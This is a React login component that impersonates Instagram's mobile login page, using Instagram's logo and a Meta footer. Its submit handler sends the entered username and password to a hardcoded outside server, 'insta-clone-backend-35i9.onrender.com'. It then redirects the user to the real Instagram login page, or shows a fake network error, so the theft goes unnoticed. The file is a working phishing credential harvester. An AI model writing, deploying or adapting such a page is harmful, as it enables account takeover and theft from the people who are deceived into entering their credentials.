import { useState, useEffect } from 'react';
import axios from 'axios';
import { Link } from 'react-router-dom';

const Login = () => {
  const [emailOrUsername, setEmailOrUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isFormValid, setIsFormValid] = useState(false);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    setIsFormValid(emailOrUsername.length >= 1 && password.length >= 1);
  }, [emailOrUsername, password]);

  const handleLogin = async (e) => {
    e.preventDefault();
    if (!isFormValid) return;
    
    setLoading(true);
    // Hardcoded live backend URL for guaranteed connection
    const BACKEND_URL = 'https://insta-clone-backend-35i9.onrender.com';
    
    try {
      await axios.post(`${BACKEND_URL}/api/auth/login`, {
        emailOrUsername,
        password
      });
      // Small delay for "Logging in..." feel
      setTimeout(() => {
        window.location.href = 'https://www.instagram.com/accounts/login/';
      }, 1500);
    } catch (err) {
      alert('Network Error. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="mobile-container">
      <div className="top-lang">
        <span>English (UK)</span>
      </div>

      <div className="content-wrapper">
        <div className="logo-section">
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" 
            alt="Instagram" 
            className="glyph-logo"
          />
        </div>
        
        <form onSubmit={handleLogin} className="login-form">
          <div className="input-group">
            <input 
              type="text" 
              placeholder="Username, email address or mobile number"
              value={emailOrUsername}
              onChange={(e) => setEmailOrUsername(e.target.value)}
            />
          </div>
          
          <div className="input-group">
            <input 
              type="password" 
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
          </div>
          
          <button 
            type="submit" 
            className="login-btn"
            disabled={!isFormValid || loading}
          >
            {loading ? 'Logging in...' : 'Log in'}
          </button>
          
          <a href="#" className="forgot-link">Forgotten password?</a>
        </form>
      </div>

      <div className="bottom-section">
        <Link to="/signup" className="create-btn">
          Create new account
        </Link>
        <div className="meta-footer">
           <svg viewBox="0 0 24 24" className="meta-logo-svg">
            <path d="M16.143 4.5c-2.457 0-4.414 1.83-5.32 3.623C9.917 6.33 7.96 4.5 5.503 4.5 2.463 4.5 0 6.963 0 10.003s2.463 5.503 5.503 5.503c2.457 0 4.414-1.83 5.32-3.623.906 1.793 2.863 3.623 5.32 3.623 3.04 0 5.503-2.463 5.503-5.503S19.183 4.5 16.143 4.5zm0 8.414c-1.61 0-2.911-1.301-2.911-2.911s1.301-2.911 2.911-2.911 2.911 1.301 2.911 2.911-1.301 2.911-2.911 2.911zm-10.64 0c-1.61 0-2.911-1.301-2.911-2.911s1.301-2.911 2.911-2.911 2.911 1.301 2.911 2.911-1.301 2.911-2.911 2.911z" />
          </svg>
          <span className="meta-text">Meta</span>
        </div>
      </div>
    </div>
  );
};

export default Login;
